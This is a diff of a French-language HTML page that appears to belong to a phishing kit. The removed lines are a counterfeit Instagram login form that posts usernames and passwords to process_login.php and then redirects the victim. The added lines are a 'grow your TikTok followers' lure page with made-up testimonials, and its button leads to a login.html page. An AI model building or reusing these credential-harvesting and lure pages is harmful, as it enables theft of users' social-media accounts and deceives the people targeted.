@@ -3,120 +3,299 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion</title>
+    <title>Augmentez vos abonnés TikTok | Stratégies Professionnelles</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        /* Reset et styles de base */
+        * {
             margin: 0;
             padding: 0;
-        }
-        .login-container {
-            background-color: white;
-            border: 1px solid #dbdbdb;
-            padding: 20px 40px;
-            text-align: center;
-            width: 350px;
-        }
-        .logo {
-            width: 175px;
-            margin: 20px 0;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background-color: #fafafa;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
-        button {
-            width: 100%;
-            padding: 8px;
-            margin: 10px 0;
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-weight: bold;
-            cursor: pointer;
+        
+        body {
+            background-color: #f8f8f8;
+            color: #111111;
+            line-height: 1.6;
         }
-        .divider {
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+        
+        /* Header stylé */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            width: 220px;
+            margin-bottom: 20px;
+            border-radius: 30%;
+        }
+        
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #111111;
+            margin-bottom: 15px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #6b6b6b;
+            margin-bottom: 25px;
+        }
+        
+        /* Section avantages */
+        .benefits {
+            background-color: white;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            margin-bottom: 30px;
+        }
+        
+        .benefit-item {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 20px;
+        }
+        
+        .benefit-icon {
+            font-size: 24px;
+            margin-right: 15px;
+            color: #FE2C55;
+        }
+        
+        .benefit-text h3 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .benefit-text p {
+            font-size: 15px;
+            color: #6b6b6b;
+        }
+        
+        /* Témoignages */
+        .testimonials {
+            margin-bottom: 30px;
+        }
+        
+        .testimonial {
+            background-color: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+        
+        .testimonial-header {
             display: flex;
             align-items: center;
-            margin: 15px 0;
-            color: #8e8e8e;
-            font-size: 13px;
+            margin-bottom: 10px;
         }
-        .divider::before, .divider::after {
-            content: "";
-            flex: 1;
-            border-bottom: 1px solid #dbdbdb;
-            margin: 0 10px;
+        
+        .testimonial-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+            object-fit: cover;
         }
-        .links {
-            margin: 15px 0;
-            font-size: 12px;
-        }
-        .links a {
-            color: #00376b;
-            text-decoration: none;
-        }
-        .footer {
-            margin-top: 20px;
+        
+        .testimonial-author {
+            font-weight: 600;
             font-size: 14px;
-            color: #8e8e8e;
+        }
+        
+        .testimonial-text {
+            font-size: 14px;
+            color: #111111;
+            padding-left: 50px;
+        }
+        
+        /* Bouton CTA */
+        .cta-button {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(45deg, #25F4EE, #000000, #FE2C55);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 20px;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 12px;
+            color: #6b6b6b;
+        }
+
+        /* Nouveaux styles pour les paragraphes supplémentaires */
+        .content-section {
+            background-color: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+
+        .content-section h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #111111;
+        }
+
+        .content-section p {
+            margin-bottom: 15px;
+            font-size: 15px;
+            color: #333333;
+        }
+
+        .highlight {
+            background-color: #FFF4F6;
+            border-left: 4px solid #FE2C55;
+            padding: 15px;
+            margin: 15px 0;
+            font-style: italic;
+            color: #111111;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+    <div class="container">
+        <header class="header">
+            <!-- Logo TikTok -->
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbxE-AI3XDIEOnwVFqPurOCfqwmhqADWQ92Q&s" alt="TikTok Logo" class="logo">
+            
+            <h1>Augmentez vos abonnés TikTok dès aujourd'hui</h1>
+            <p class="subtitle">Découvrez la méthode professionnelle utilisée par les créateurs pour développer leur audience rapidement</p>
+        </header>
         
-        <form id="loginForm" action="process_login.php" method="POST">
-            <input type="text" name="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
-            <input type="password" name="password" placeholder="Mot de passe" required>
-            <button type="submit">Se connecter</button>
-        </form>
-        
-        <div class="divider">ou</div>
-        
-        <div class="links">
-            <a href="#" onclick="window.location.reload();">Mot de passe oublié ?</a>
-            <br><br>
-            <a href="#" onclick="window.location.reload();">Créer un compte</a>
-        </div>
-        
-        <div class="footer">
-            Meta
-        </div>
-    </div>
+        <section class="benefits">
+            <div class="benefit-item">
+                <div class="benefit-icon">🚀</div>
+                <div class="benefit-text">
+                    <h3>Croissance virale</h3>
+                    <p>Nos stratégies optimisent l'algorithme de TikTok pour maximiser votre visibilité et atteindre des millions de vues.</p>
+                </div>
+            </div>
+            
+            <div class="benefit-item">
+                <div class="benefit-icon">🎯</div>
+                <div class="benefit-text">
+                    <h3>Audience engagée</h3>
+                    <p>Attirez des followers qui interagissent avec votre contenu, augmentant ainsi votre taux d'engagement.</p>
+                </div>
+            </div>
+            
+            <div class="benefit-item">
+                <div class="benefit-icon">📈</div>
+                <div class="benefit-text">
+                    <h3>Analyses avancées</h3>
+                    <p>Nous décryptons les tendances TikTok pour vous aider à créer des contenus qui performent.</p>
+                </div>
+            </div>
+            
+            <div class="benefit-item">
+                <div class="benefit-icon">💡</div>
+                <div class="benefit-text">
+                    <h3>Conseils spécialisés</h3>
+                    <p>Recevez des recommandations personnalisées pour booster votre présence sur TikTok.</p>
+                </div>
+            </div>
+        </section>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        <!-- Nouvelle section de contenu -->
+        <div class="content-section">
+            <h2>Pourquoi TikTok est la plateforme à ne pas négliger en 2024</h2>
+            <p>Avec plus d'un milliard d'utilisateurs actifs mensuels, TikTok est devenu bien plus qu'une application de divertissement. C'est aujourd'hui une plateforme incontournable pour les créateurs de contenu, les marques et les entrepreneurs.</p>
             
-            // Soumettre le formulaire via AJAX pour traiter les identifiants en PHP
-            var formData = new FormData(this);
+            <p>Contrairement à d'autres réseaux sociaux où il faut des années pour construire une audience, TikTok offre la possibilité de devenir viral en quelques heures seulement. Notre méthode vous montre exactement comment tirer parti de cet avantage unique.</p>
             
-            fetch(this.action, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if(response.ok) {
-                    window.location.href = 'mer.html';
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-        });
-    </script>
+            <div class="highlight">
+                "L'algorithme de TikTok récompense la qualité et la pertinence bien plus que le nombre d'abonnés. Avec les bonnes stratégies, même un compte récent peut atteindre des milliers de vues."
+            </div>
+        </div>
+
+        <!-- Deuxième section de contenu -->
+        <div class="content-section">
+            <h2>Comment notre méthode fonctionne</h2>
+            <p>Notre approche en 3 étapes a aidé des milliers de créateurs à développer leur audience sur TikTok :</p>
+            
+            <p><strong>1. Audit complet de votre compte :</strong> Nous analysons votre contenu actuel, vos hashtags, vos heures de publication et vos statistiques pour identifier ce qui fonctionne et ce qui peut être amélioré.</p>
+            
+            <p><strong>2. Stratégie de contenu sur mesure :</strong> En fonction de votre niche, nous développons un plan de contenu qui maximise vos chances d'apparaître sur la page "Pour Toi".</p>
+            
+            <p><strong>3. Optimisation continue :</strong> Nous ajustons régulièrement votre stratégie en fonction des performances et des nouvelles tendances sur TikTok.</p>
+            
+            <p>Cette méthode a permis à nos clients de multiplier par 10 leur nombre d'abonnés en moyenne en seulement 3 mois.</p>
+        </div>
+        
+        <section class="testimonials">
+            <h2 style="font-size: 20px; margin-bottom: 15px; text-align: center;">Ils ont augmenté leurs abonnés TikTok</h2>
+            
+            <div class="testimonial">
+                <div class="testimonial-header">
+                    <img src="https://randomuser.me/api/portraits/women/32.jpg" alt="Marie D." class="testimonial-avatar">
+                    <span class="testimonial-author">Camille T., danseuse</span>
+                </div>
+                <p class="testimonial-text">"En 2 mois, je suis passée de 500 à 50 000 abonnés grâce à ces méthodes. Maintenant, je collabore avec des grandes marques de sport !"</p>
+            </div>
+            
+            <div class="testimonial">
+                <div class="testimonial-header">
+                    <img src="https://randomuser.me/api/portraits/men/45.jpg" alt="Thomas L." class="testimonial-avatar">
+                    <span class="testimonial-author">Julien R., humoriste</span>
+                </div>
+                <p class="testimonial-text">"Je ne pensais pas que c'était possible d'avoir autant de vues. Un de mes vidéos a atteint 2 millions de vues grâce aux conseils reçus !"</p>
+            </div>
+
+            <div class="testimonial">
+                <div class="testimonial-header">
+                    <img src="https://randomuser.me/api/portraits/women/65.jpg" alt="Sophie M." class="testimonial-avatar">
+                    <span class="testimonial-author">Sophie M., entrepreneure</span>
+                </div>
+                <p class="testimonial-text">"TikTok a transformé mon business. Après avoir appliqué ces stratégies, mes ventes en ligne ont augmenté de 300% en 4 mois."</p>
+            </div>
+        </section>
+        
+        <!-- Commentaires convaincants -->
+        <div style="background-color: #f0f0f0; padding: 20px; border-radius: 12px; margin-bottom: 25px;">
+            <p style="font-style: italic; margin-bottom: 15px; color: #555;">"Dans l'écosystème ultra-dynamique de TikTok, ceux qui comprennent l'algorithme et savent créer des contenus engageants obtiennent des résultats exceptionnels. Les autres restent invisibles."</p>
+            
+            <p style="font-style: italic; color: #555;">"Imaginez ce que vous pourriez accomplir avec 10 000, 50 000 ou 100 000 abonnés engagés. Les opportunités de monétisation deviennent illimitées."</p>
+
+            <p style="font-style: italic; margin-top: 15px; color: #555;">"Le moment idéal pour commencer à développer votre audience sur TikTok, c'est maintenant. Plus vous attendez, plus il sera difficile de vous faire une place."</p>
+        </div>
+        
+        <!-- Bouton CTA (gardé intact comme demandé) -->
+        <a href="login.html" class="cta-button">AUGMENTER MES ABONNÉS TIKTOK</a>
+        
+        <footer class="footer">
+            <p>© 2017-2025 TikTok Growth | Tous droits réservés</p>
+            <p style="margin-top: 5px;">Ce service n'est pas affilié à TikTok ou ByteDance</p>
+        </footer>
+    </div>
 </body>
-</html>
+                                               </html
